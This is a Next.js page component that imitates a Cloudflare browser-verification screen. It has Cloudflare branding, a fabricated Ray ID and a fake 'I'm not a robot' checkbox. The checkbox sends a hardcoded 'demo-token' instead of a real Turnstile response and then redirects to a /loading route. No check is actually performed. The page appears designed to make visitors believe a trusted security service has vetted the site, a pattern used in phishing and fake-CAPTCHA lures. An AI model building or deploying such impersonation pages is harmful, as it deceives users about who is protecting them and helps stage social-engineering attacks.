'use client'

import { useState } from 'react'
import { useRouter } from 'next/navigation'

export default function Home() {
  const [isVerifying, setIsVerifying] = useState(false)
  const router = useRouter()

  const handleTurnstileSuccess = async (token) => {
    setIsVerifying(true)
    
    try {
      const response = await fetch('/api/turnstile', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ token })
      })

      if (response.ok) {
        router.push('/loading')
      } else {
        alert('Verification failed. Please try again.')
        setIsVerifying(false)
      }
    } catch (error) {
      alert('Network error. Please try again.')
      setIsVerifying(false)
    }
  }

  return (
    <div className="min-h-screen bg-white flex items-center justify-center">
      <div className="max-w-md w-full mx-auto p-6">
        <div className="text-center mb-8">
          <div className="flex items-center justify-center mb-4">
            <div className="w-8 h-8 bg-orange-500 rounded mr-2"></div>
            <span className="text-xl font-semibold text-gray-800">Cloudflare</span>
          </div>
          <h1 className="text-2xl font-bold text-gray-900 mb-2">Checking your browser</h1>
          <p className="text-gray-600">This process is automatic. Your browser will redirect to your requested content shortly.</p>
        </div>

        <div className="bg-gray-50 border border-gray-200 rounded-lg p-6 mb-6">
          <div className="flex items-center mb-4">
            <div className="w-4 h-4 bg-green-500 rounded-full mr-3"></div>
            <span className="text-sm text-gray-700">Checking if site connection is secure</span>
          </div>
          <div className="text-xs text-gray-500 mb-4">
            Please complete the security check to access the site
          </div>
          
          {!isVerifying ? (
            <div className="flex justify-center">
              <div 
                className="w-64 h-16 bg-gray-100 border border-gray-300 rounded flex items-center justify-center cursor-pointer hover:bg-gray-50"
                onClick={() => handleTurnstileSuccess('demo-token')}
              >
                <input type="checkbox" className="mr-2" />
                <span className="text-sm text-gray-700">I'm not a robot</span>
              </div>
            </div>
          ) : (
            <div className="flex justify-center">
              <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-orange-500"></div>
            </div>
          )}
        </div>

        <div className="text-center text-xs text-gray-500">
          <p>Performance & security by Cloudflare</p>
          <p className="mt-1">Ray ID: 8234a4c2e9f1a2b3</p>
        </div>
      </div>
    </div>
  )
}